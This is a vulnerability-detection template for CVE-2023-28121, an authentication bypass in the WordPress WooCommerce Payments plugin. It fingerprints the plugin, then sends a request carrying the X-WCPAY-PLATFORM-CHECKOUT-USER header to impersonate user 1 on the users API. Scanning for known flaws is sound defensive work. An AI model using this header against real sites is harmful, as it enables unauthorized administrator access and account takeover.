id: CVE-2023-28121
name: "WordPress WooCommerce Payments Authentication Bypass"
severity: critical
description: "WordPress WooCommerce Payments plugin before 5.6.2 allows unauthenticated attackers to impersonate administrators via the X-WCPAY-PLATFORM-CHECKOUT-USER header."
reference: CWE-287
confidence: confirmed
requests:
  - method: GET
    path: "/wp-content/plugins/woocommerce-payments/readme.txt"
    matchers:
      - type: body
        words:
          - "WooCommerce Payments"
          - "Stable tag"
      - type: status
        status: [200]
    condition: and
  - method: GET
    path: "/wp-json/wp/v2/users"
    headers:
      X-WCPAY-PLATFORM-CHECKOUT-USER: "1"
    matchers:
      - type: body
        words:
          - "id"
          - "name"
          - "slug"
      - type: status
        status: [200]
    condition: and
